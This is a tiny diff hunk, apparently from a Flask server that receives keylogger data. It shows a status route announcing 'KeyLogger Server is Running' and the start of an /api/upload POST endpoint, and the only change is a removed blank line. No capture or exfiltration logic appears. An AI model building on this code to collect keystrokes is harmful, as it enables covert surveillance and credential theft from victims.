@@ -29,7 +29,6 @@ def home():
     """הוסף נקודת קצה מהשרת המרוחק"""
     return "KeyLogger Server is Running"
 
-
 @app.route('/api/upload', methods=['POST'])
 
 def save_data():
